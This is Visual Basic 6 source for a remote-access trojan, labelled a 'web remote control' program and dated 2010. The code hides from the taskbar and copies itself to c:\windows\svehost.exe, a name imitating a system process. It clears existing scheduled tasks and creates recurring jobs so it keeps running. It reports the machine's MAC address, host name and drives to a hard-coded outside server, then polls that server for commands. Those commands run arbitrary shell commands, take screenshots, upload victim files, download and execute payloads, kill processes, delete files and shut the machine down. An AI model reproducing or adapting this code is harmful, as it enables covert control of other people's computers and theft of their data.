VERSION 5.00
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   AutoRedraw      =   -1  'True
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Web Remote[exe]"
   ClientHeight    =   630
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4170
   DrawMode        =   2  'Blackness
   FillStyle       =   0  'Solid
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   630
   ScaleWidth      =   4170
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   240
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'----------------------------------------------------------
'/////////////////// ��.һ�� [TYF]    /////////////////////
'/////////////////// ��ҳ�첽Զ�̿��Ƴ���[exe��]  /////////
'/////////////////// cm.ivan@163.com  /////////////////////
'/////////////////// 23:09 2010-3-24  /////////////////////
'----------------------------------------------------------

'//// ���ڽ�ͼ /////
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Private Declare Function GetActiveWindow Lib "user32" () As Long
'//// ���ڽ�ͼ /////

Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
'----------------------------------------------------------
'/////////////////// ��������  ////////////////////////////
'----------------------------------------------------------

Dim SysReg, FullFileName, FullNewsName, sysStage

Dim mc, mo, Mac
Dim WshNetwork, Host
Dim Fsys, coldisks, eDisk, disks

Dim UrlTarget, getSite  'ȫ�ֱ�����Ŀ���ַ

Dim ScreenPath As String  '������
Dim SFile As String

Private Sub Form_Load()
On Error Resume Next  '�ݴ�ģʽ

'ScreenPath = "d:\zt"    '������
 If ScreenPath <> "" Then MkDir ScreenPath      '���ļ���
 Me.AutoRedraw = True
 
 
 


Dim dTypeBinary, adTypeText, adLongVarBinary
    adTypeBinary = 1
    adTypeText = 2
    adLongVarBinary = 205


App.TaskVisible = False
Me.Hide


'/////////////////////////////////////////////////////////////////////
'///////////////////////// �趨 �������� /////////////////////////////
'/////////////////////////////////////////////////////////////////////

NewsName = "svehost.exe"


FullFileName = LCase(App.Path & "\" & App.EXEName & ".exe")
FullNewsName = LCase("c:\windows\" & NewsName)

If FullNewsName <> FullFileName Then

 Dim Bag1, pipe1
 Set Bag1 = GetObject("winmgmts:\\.\root\cimv2")
 Set pipe1 = Bag1.execquery("select * from win32_process where Name='" & NewsName & "'")
     For Each i In pipe1
        i.Terminate
     Next
 Set pipe1 = Nothing
 Set Bag1 = Nothing

 Call Sleep(1000)
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set c = fso.GetFile(FullFileName) '������λ��
     c.Copy (FullNewsName)         '������
 Set c = Nothing
 Set fso = Nothing
 
 
 Call Sleep(1000)
 Set objShell = CreateObject("wscript.shell")
     objShell.Run FullNewsName, 0
 Set objShell = Nothing

 Call Sleep(1000)
'/// ��ռƻ�
Set objShell = CreateObject("wscript.shell")
    objShell.Run "cmd.exe /c net start schedule", 0
Set objShell = Nothing

Set objShell = CreateObject("wscript.shell")
    objShell.Run "cmd.exe /c at /del /yes", 0
Set objShell = Nothing


Call Sleep(1000)
'/// д��ƻ�
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objNewJob = objWMIService.Get("Win32_ScheduledJob")
  errJobCreated = objNewJob.Create(FullNewsName, "********100000.000000+480", True, 1 Or 2 Or 4 Or 8 Or 16 Or 32 Or 64, , , JobID)
Select Case errJobCreated
       Case 0
       State = "�ɹ����"
       Case 1
       State = "��֧��"
       Case 2
       State = "���ʱ��ܾ�"
       Case 8
       State = "���ֲ�������"
       Case 9
       State = "δ����·��"
       Case 21
       State = "������Ч"
       Case 22
       State = "������δ����"
       Case Else
       State = "״̬δ֪"
End Select

  errJobCreated = objNewJob.Create(FullNewsName, "********150000.000000+480", True, 1 Or 2 Or 4 Or 8 Or 16 Or 32 Or 64, , , JobID)
  errJobCreated = objNewJob.Create(FullNewsName, "********200000.000000+480", True, 1 Or 2 Or 4 Or 8 Or 16 Or 32 Or 64, , , JobID)
  errJobCreated = objNewJob.Create(FullNewsName, "********000000.000000+480", True, 1 Or 2 Or 4 Or 8 Or 16 Or 32 Or 64, , , JobID)

Set objNewJob = Nothing
Set objWMIService = Nothing



 
'/// д��ע���
'Set SysReg = CreateObject("wscript.shell")
'    SysReg.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RemoteVbs[TYF]", FullNewsName
'Set SysReg = Nothing

 sysStage = "false"
 
 End  '��Ϊ������ָ��Ŀ¼�����У������Թر�
End If







'////// ��ȡmac /////
Set mc = GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
For Each mo In mc
    If mo.IPEnabled = True Then
       Mac = mo.MacAddress
       Exit For
       End If
    Next
Set mc = Nothing

'////// ��������� /////
Set WshNetwork = CreateObject("WScript.Network")
    Host = WshNetwork.ComputerName 'ȡ�����������
Set WshNetwork = Nothing

'////// ��ȡ�̷� /////
Set Fsys = CreateObject("Scripting.FileSystemObject")
Set coldisks = Fsys.Drives
    For Each eDisk In coldisks
        If eDisk.Drivetype = 2 Then
           disks = disks & eDisk & "|"
        End If
    Next
Set coldisks = Nothing
Set Fsys = Nothing
     
 

'--------------------------------------------------------------------
'/////////////////// ��������,���ú���   ////////////////////////////
'--------------------------------------------------------------------
   Urlconfig = "http://www.zc62.com/old/up/cmivan/vbs/config.asp"
If FullNewsName = FullFileName Then
   Do While UrlTarget = ""      '��ȡָ����ַ
      UrlTarget = getAddress(Urlconfig)
      UrlTarget = Replace(UrlTarget, Chr(10), "")
      UrlTarget = Replace(UrlTarget, Chr(13), "")
      Call Sleep(1000)
   Loop

   If UrlTarget <> "" Then Call loopRun          'ѭ��ִ��
End If
     

End Sub









'--------------------------------------------------------------------
'/////////////////// �г������̷�           /////////////////////////
'--------------------------------------------------------------------
Function gethost()
     On Error Resume Next  '�ݴ�ģʽ
     If disks <> "" Then Call BackCmd("host")
End Function


'--------------------------------------------------------------------
'/////////////////// Url����ת��           //////////////////////////
'--------------------------------------------------------------------
Function URLEncoding(vstrIn)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     strReturn = ""
     For i = 1 To Len(vstrIn)
         ThisChr = Mid(vstrIn, i, 1)
         If Abs(Asc(ThisChr)) < &HFF Then
            strReturn = strReturn & ThisChr
         Else
            innerCode = Asc(ThisChr)
            If innerCode < 0 Then
               innerCode = innerCode + &H10000
            End If
            Hight8 = (innerCode And &HFF00) \ &HFF
            Low8 = innerCode And &HFF
            strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
         End If
     Next
     URLEncoding = strReturn
End Function
'--------------------------------------------------------------------
'///////////////// �ύ���ݵ�������        //////////////////////////
'--------------------------------------------------------------------
Function BackCmd(Cmdstr)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim xmlHttp, xmlget, bgpos, endpos
         Cmdstr = Replace(Cmdstr, " ", "%20")
         Cmdstr = Replace(Cmdstr, "&", "%26")
         Cmdstr = Replace(Cmdstr, Chr(13), "{-}")
         
     Set xmlHttp = CreateObject("Msxml2.ServerXMLHTTP")
         strA = URLEncoding("cmd=" & Cmdstr & "&mac=" & Mac & "&host=" & Host & "&disk=" & disks)
     With xmlHttp
         .open "POST", UrlTarget & "/server.asp", False
         .setRequestHeader "Content-Length", Len(strA)
         .setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
         .send strA
      If .Status <> 200 Then xmlget = "error"
     End With
     Set xmlHttp = Nothing
End Function



'--------------------------------------------------------------------
'//////////////// ��ȡ��ҳ������  ///////////////////////////////////
'--------------------------------------------------------------------
Function GetHttpPage(url)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim xmlHttp, xmlget, bgpos, endpos
     Set xmlHttp = CreateObject("Msxml2.ServerXMLHTTP")
         strA = ""
         With xmlHttp
           .open "GET", url, False
           .setRequestHeader "Content-Length", Len(strA)
           .setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
           .send strA
           If .Status <> 200 Then
              GetHttpPage = "error"
           Else
              GetHttpPage = BytesToBstr(xmlHttp.responsebody)
           End If
         End With
 Set xmlHttp = Nothing
End Function
'--------------------------------------------------------------------
'///////// �����ļ���Сת��             //////////////////////////////
'--------------------------------------------------------------------
Function FormatSize(SZ)
     On Error Resume Next  '�ݴ�ģʽ
     Dim i, Unit4Size
     Unit4Size = "�ֽ�KBMBGB"
     If SZ <> "" And IsNumeric(SZ) Then
        Do While SZ > 1024 And Err = 0
           If Len(SZ) >= 10 Then
              i = 3
              A_SZ = Left(SZ, Len(SZ) - 4)
              SZ = A_SZ \ 1024 * 100
            Else
              i = i + 1
              SZ = Int(SZ) \ 1024
           End If
        Loop
        FormatSize = SZ & " " & Mid(Unit4Size, 1 + 2 * i, 2)
     End If
End Function
'--------------------------------------------------------------------
'///////// ����ѭ����⣬��ִ��         //////////////////////////////
'--------------------------------------------------------------------
Function loopRun()
     On Error Resume Next  '�ݴ�ģʽ
           Dim GetCmd
           GetCmd = GetHttpPage(UrlTarget & "/cmd.txt") '��������
           If GetCmd <> "" Then
              GetCmds = Split(GetCmd, "|")
             If CStr(GetCmds(0)) = CStr(Mac) Or CStr(GetCmds(0)) = CStr("ToAll") Then '��֤MAC
             
             If UBound(GetCmds) >= 1 Then   '��֤�Ƿ����
             
Select Case LCase(GetCmds(1))
  '---------------------------------------------------
  '--------------| ϵͳ���� |------------------------->
  '---------------------------------------------------

       '>>>>>>>>>>>>>>>> �г�ϵͳ�ļ�/Ŀ¼
       Case "sys_dir"
             Path = GetCmds(2)
             If Len(Path) > 3 Then
                If Right(Path, 1) = "\" Then Path = Left(Path, Len(Path) - 1)
             ElseIf Len(Path) = 2 Then
                Path = Path & "\"
             End If
             
             Dim i, TempStr, FlSpace
             Set objFSO = CreateObject("Scripting.FileSystemObject")
             Set CrntFolder = objFSO.GetFolder(Path)

                 TreeStr = "folder|"
             For Each SubFolder In CrntFolder.SubFolders
                 'If ShowSize Then TreeStr = TreeStr  &  FormatSize(SubFolder.size)
                 TreeStr = TreeStr & "|" & SubFolder.Name
             Next

                 TreeStr = TreeStr & "{#}file|"
             For Each ConFile In CrntFolder.Files
                 TreeStr = TreeStr & "|" & ConFile.Name & "{s}"
                 TreeStr = TreeStr & FormatSize(ConFile.Size)
             Next
             BackCmdStr = TreeStr
             
             
             
       '>>>>>>>>>>>>>>>> ע��/����ϵͳ/�ػ�
       Case "sys_shutdown_0", "sys_shutdown_2", "sys_shutdown_8"
             Dim shutdown_Id
             shutdown_Id = Int(Right(GetCmds(1), 1))
             Set colOperatingSystems = GetObject("winmgmts:{(Shutdown)}").execquery("Select * from Win32_OperatingSystem")
                 For Each ObjOperatingSystem In colOperatingSystems
                     ObjOperatingSystem.Win32Shutdown (shutdown_Id)
                 Next
             Set colOperatingSystems = Nothing
       '>>>>>>>>>>>>>>>> ����cmd ����
       Case "sys_cmd"
             '--- ִ������
             Set objShell = CreateObject("wscript.shell")
                 objShell.Run "cmd.exe /c " & GetCmds(2) & " >c:\windows\syscmd~.txt", 0
             Set objShell = Nothing
             '--- ��ȡ��ʱ�ļ�
                 Call Sleep(1000)
             Set objFSO = CreateObject("Scripting.FileSystemObject")
                 Set objCountFile = objFSO.OpenTextFile("c:\windows\syscmd~.txt", 1, True)
                     If Not objCountFile.AtEndofStream Then
                        FSOFileRead = objCountFile.Readall
                     End If
                     objCountFile.Close
                 Set objCountFile = Nothing
             Set objFSO = Nothing
             
             GetCmds(1) = "sys_txt"      'ǿ���޸ķ�����Ϣ����������Ϣ��ʾ
             BackCmdStr = ">> (C) ��Ȩ���� 1985-2001 Microsoft Corp. " & Chr(13) & FSOFileRead
             
             
             
       '>>>>>>>>>>>>>>>> �г�ϵͳ����
       Case "sys_tasklist"
             Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
             Set process = wmi.execquery("select * from win32_process")
             For Each objprocess In process
                 objprocess.GetOwner UserName, strUserDomain
                 All_PID = All_PID & "{list}" & objprocess.ExecutablePath & "*" & objprocess.Name & "*"
                 All_PID = All_PID & UserName & "*" & objprocess.processid
             Next
             Set wmi = Nothing
             Set process = Nothing
             BackCmdStr = All_PID
             
             
             
       '>>>>>>>>>>>>>>>> �ر�ϵͳ����
       Case "sys_killtask"
             C_cmds = Split(GetCmds(2), "|")
             C_Name = "-"
             For i = 0 To UBound(C_cmds)
                 C_Name = C_Name & " or processid='" & C_cmds(i) & "'"
             Next
                 C_Name = Replace(C_Name, "- or", "")
             Dim Bag1, pipe1
             Set Bag1 = GetObject("winmgmts:\\.\root\cimv2")
             Set pipe1 = Bag1.execquery("select * from win32_process where" & C_Name)
                 For Each i In pipe1
                     i.Terminate
                 Next
             Set pipe1 = Nothing
             Set Bag1 = Nothing
             GetCmds(1) = "sys_txt"      'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
             BackCmdStr = "�ɹ����� ����PID: " & GetCmds(2) & " ��"
             
               
             
       '>>>>>>>>>>>>>>>> ��ȡ��Ļ
       Case "sys_getscreen"

            Me.Width = Screen.Width
            Me.Height = Screen.Height
            Me.Hide
            BitBlt Me.hDC, 0, 0, Screen.Width, Screen.Height, GetDC(GetActiveWindow), 0, 0, vbSrcCopy 'ץ��
            SFile = ScreenPath & "screen.jpg"
            SavePicture Me.Image, SFile '����Me.hDC
            Call UpFiles("screen.jpg")
            GetCmds(1) = "sys_txt"
            BackCmdStr = "�ѳɹ���ͼ"
                
             
             
       '>>>>>>>>>>>>>>>> �½��ļ�(���������)
       Case "sys_newfile"
             GetFile = GetCmds(2)                        '�����ϵ��ļ���ַ
             GetFiles = Split(GetFile, "/")
             ToFile = GetFiles(UBound(GetFiles))         '����ɵı����ļ�
                          
                      ToFile = Replace(ToFile, " ", "")
             If ToFile = "" Then
                ToFile = "hongya2012.htm"
                Else
                If InStr(ToFile, ".") <> 0 Then
                   ToFile = Replace(ToFile, ".", "_.")
                   Else
                   ToFile = ToFile & "_.htm"
                End If
             End If
ToFile = "C:\WINDOWS\system32\" & ToFile
                
             
             Set xmlHttp = CreateObject("Microsoft.XMLHTTP") '����HTTP�������
             Set stream = CreateObject("ADODB.Stream")       '����ADO����������
             '--------------| ���ǲ�ɱ |-----------------
         xmlHttp.open "GET", GetFile, False '������
                 xmlHttp.send      '��������
                 stream.mode = 3     '����������Ϊ��дģʽ
                 stream.Type = 1     '����������Ϊ������ģʽ
                 stream.open       '��������
                 stream.write (xmlHttp.responsebody) '���������ķ��ر�����������д��������
                 stream.SaveToFile ToFile, 2         '������������Ϊ�ļ�
             '-------------------------------------------
             Set xmlHttp = Nothing
             Set stream = Nothing
             GetCmds(1) = "sys_txt"      'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
             BackCmdStr = "�ɹ��½��ļ�: " & ToFile & " ��"
             
             
       '>>>>>>>>>>>>>>>> ע���༭(���ӵ�)
       Case "sys_reg"
             Set MainUrl = CreateObject("wscript.shell")
                 RegPath = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Window Title"
                 Tf = MainUrl.RegWrite(RegPath, "[�׿�.�й�]")
             Set MainUrl = Nothing
             

  '---------------------------------------------------
  '--------------| �������� |------------------------->
  '---------------------------------------------------
  
       '>>>>>>>>>>>>>>>> ����ҳ
       Case "sys_openweb"
             Set objShell = CreateObject("Wscript.Shell")
                 objShell.Run (GetCmds(2))
             Set objShell = Nothing
             
             GetCmds(1) = "sys_txt"   'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
             BackCmdStr = "�ɹ�����ҳ: " & GetCmds(2) & " ��"
             
             
       '>>>>>>>>>>>>>>>> ������Ϣ
       Case "sys_showmsg"
             MsgBox GetCmds(2)
             GetCmds(1) = "sys_txt"   'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
             BackCmdStr = "�ɹ�������Ϣ: " & GetCmds(2) & " ��"
             
             
       '>>>>>>>>>>>>>>>> ����
       Case "sys_windowblack"
             Set ie = CreateObject("internetexplorer.application")
                 ie.navigate "about:blank"
                 ie.fullscreen = 1
                 ie.statusbar = 0
                 ie.document.bgColor = "black"
                 ie.document.fgColor = "White"
                 ie.document.body.Scroll = "no"
                 ie.Visible = 1
                 Randomize
             Set ObjDiv = ie.document.createElement("div")
             Set ObjDoc = ie.document.body
                 ObjDoc.appendChild ObjDiv
                 With ObjDiv
                     .Style.Position = "absolute"
                       .Style.Left = Rnd * ObjDoc.clientWidth
                      .Style.Top = Rnd * ObjDoc.clientHeight
                      .Style.Width = "auto"
                      .Style.FontSize = "20px"
                      .innerHTML = GetCmds(2)
                 End With
             Set ObjDoc = Nothing
             Set ObjDiv = Nothing
             GetCmds(1) = "sys_txt"   'ǿ���޸ķ�����Ϣ�����ı���Ϣ��ʾ
             BackCmdStr = "������Ϣ: " & GetCmds(2) & " ��"


  '---------------------------------------------------
  '--------------| �ļ����� |------------------------->
  '---------------------------------------------------
  
       '>>>>>>>>>>>>>>>> ��ȡ�ļ�
       Case "file_read"
            Dim file_read
                file_read = UpFiles(GetCmds(2))
            GetCmds(1) = "sys_txt"
            BackCmdStr = "�ļ�:" & GetCmds(2) & file_read
             
             
       '>>>>>>>>>>>>>>>> �����ļ�
       Case "file_copy"
             fcopys = Split(GetCmds(2), "{_}")
             If UBound(fcopys) = 1 Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set c = fso.GetFile(fcopys(0)) '������λ��
                    c.Copy (fcopys(1))         '������
                Set c = Nothing
                Set fso = Nothing
             End If
             GetCmds(1) = "sys_txt"
             BackCmdStr = "�Ѹ����ļ�:" & GetCmds(2)
             
             
       '>>>>>>>>>>>>>>>> �������ļ�
       Case "file_rename"
             frenames = Split(GetCmds(2), "{_}")
             If UBound(frenames) = 1 Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set c = fso.GetFile(frenames(0)) 'Ҫ���������ļ�
                    c.Name = frenames(1)         '������
                Set c = Nothing
                Set fso = Nothing
             GetCmds(1) = "sys_txt"
             BackCmdStr = "���������ļ�:" & GetCmds(2)
             End If


       '>>>>>>>>>>>>>>>> �޸��ļ�����
       Case "file_attrib"
             'Fso.GetFile(Fname)
             'Fso.GetFolder(Fname)
             'A.attributes=A.attributes+2+4  '�������
             '1-ֻ��;2-����;4-ϵͳ
             attribs = Split(GetCmds(1), "{_}")
             If UBound(attribs) = 1 Then
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                Set objFile = objFSO.GetFile(attribs(0))
                    objFile.Attributes = objFile.Attributes & attribs(1)
                Set objFile = Nothing
                Set objFSO = Nothing
             End If

       '>>>>>>>>>>>>>>>> ɾ���ļ�
       Case "file_del"
             Set fso = CreateObject("scripting.filesystemobject")
                 fso.deleteFile GetCmds(2)
                 GetCmds(1) = "sys_txt"
                 BackCmdStr = "��ɾ���ļ�:" & GetCmds(2)
             Set fso = Nothing
             
       '>>>>>>>>>>>>>>>> ִ���ļ�
       Case "file_run"
             Set objShell = CreateObject("wscript.shell")
                 objShell.Run GetCmds(2), 0
                 GetCmds(1) = "sys_txt"
                 BackCmdStr = "�������ļ�:" & GetCmds(2)
             Set objShell = Nothing
             
             
End Select

'----------------|  �ύ��������  |-----------------
      If BackCmdStr <> "" And Err = 0 Then
         Call BackCmd(GetCmds(1) & "{#}" & BackCmdStr)
       Else
         Call BackCmd("sys_txt{#}ָ�����ִ��ʧ��!")
      End If
'---------------------------------------------------

             End If
             End If
           End If
           
End Function


    
    
'----------------|  ѭ��ִ�У�֪����ȡ����ַΪֹ  |-----------------
Function getAddress(url)
    On Error Resume Next  '�ݴ�ģʽ
    t_getAddress = GetHttpPage(url)
    If t_getAddress <> "" And Len(t_getAddress) > 12 Then
       If Right(t_getAddress, 1) = "/" Then t_getAddress = Left(t_getAddress, Len(t_getAddress) - 1)
         getAddress = t_getAddress   'ע��:��ַ���治�ü�"/"
    Else
         getAddress = ""
    End If
End Function






'--------------------------------------------------------------------
'//////////////// ���ַ�תΪָ�����룬��ֹ���� //////////////////////
'--------------------------------------------------------------------
Public Function BytesToBstr(body)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim ObjStream
     Set ObjStream = CreateObject("adodb.stream")
         ObjStream.Type = 1
         ObjStream.mode = 3
         ObjStream.open
         ObjStream.write body
         ObjStream.Position = 0
         ObjStream.Type = 2
         ObjStream.Charset = "gb2312"    '��ֹ����
         BytesToBstr = ObjStream.ReadText
         ObjStream.Close
     Set ObjStream = Nothing
End Function

'--------------------------------------------------------------------
'//////////////// ���ַ�תΪָ�����룬��ֹ���� //////////////////////
'--------------------------------------------------------------------
Public Function StringToBytes(ByVal strData)
  On Error Resume Next
    Dim objFile
    Set objFile = CreateObject("ADODB.Stream")
        objFile.Type = 2
        objFile.Charset = "gb2312"
        objFile.open
        objFile.WriteText strData
        objFile.Position = 0
        objFile.Type = 1
        StringToBytes = objFile.Read(-1)
        objFile.Close
    Set objFile = Nothing
End Function

'------------------------------------------------------
'//////////////// ��ָ���ļ�����//////////////////////
'------------------------------------------------------
Public Function GetBytes(ByVal Path)
  On Error Resume Next
  Dim objFile
  Set objFile = CreateObject("ADODB.Stream")
      objFile.Type = 1
      objFile.open
      objFile.LoadFromFile Path
      GetBytes = objFile.Read(-1)
      objFile.Close
  Set objFile = Nothing
End Function


'------------------------------------------------------
'//////////////// �ϴ�ָ���ļ�   //////////////////////
'------------------------------------------------------
Public Function UpFiles(ByVal Path)
  On Error Resume Next
  Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
  Set objTemp = CreateObject("ADODB.Stream")
      objTemp.Type = 1
      objTemp.open
    
      tmp = tmp & vbCrLf & "filename=""" & Path & """" & vbCrLf
      tmp = tmp & "Content-Disposition: form-data;name=""upload"";filename=""" & Path & """" & vbCrLf & vbCrLf
     
      objTemp.write StringToBytes(tmp)
   If VarType(vtValue) = (vbByte Or vbArray) Then
      objTemp.write "" & Path & ""
   Else
      objTemp.write GetBytes("" & Path & "")
   End If
      objTemp.Position = 0
      xmlHttp.open "POST", UrlTarget & "/vbsUpload.asp", False
      xmlHttp.setRequestHeader "Content-Type", "multipart/form-data"
      xmlHttp.setRequestHeader "Content-Length", objTemp.Size
      xmlHttp.send objTemp
    
      If xmlHttp.Status <> 200 Then
         BackPageInfo = "error"
      Else
         BackPageInfo = BytesToBstr(xmlHttp.responsebody)
      End If
      UpFiles = BackPageInfo
    objTemp.Close
  Set objTemp = Nothing
  Set xmlHttp = Nothing
End Function




'------------------------------------------------------
'//////////////// ����ָ���ļ�   //////////////////////
'------------------------------------------------------
Public Function DownFiles(ByVal GetFile, ByVal ToFile)
  On Error Resume Next
  Set xmlHttp = CreateObject("Microsoft.XMLHTTP") '����HTTP�������
  Set stream = CreateObject("ADODB.Stream")       '����ADO����������
  '--------------| ���ǲ�ɱ |-----------------
      xmlHttp.open "GET", GetFile, False '������
      xmlHttp.send                    '��������
      stream.mode = 3     '����������Ϊ��дģʽ
      stream.Type = 1     '����������Ϊ������ģʽ
      stream.open         '��������
      stream.write (xmlHttp.responsebody) '���������ķ��ر�����������д��������
      stream.SaveToFile ToFile, 2         '������������Ϊ�ļ�
  '-------------------------------------------
      DownFiles = True
  Set xmlHttp = Nothing
  Set stream = Nothing
End Function

Private Sub Timer1_Timer()
         Call gethost                  '��ʼ��
         Call loopRun                  'ѭ��ִ��
End Sub
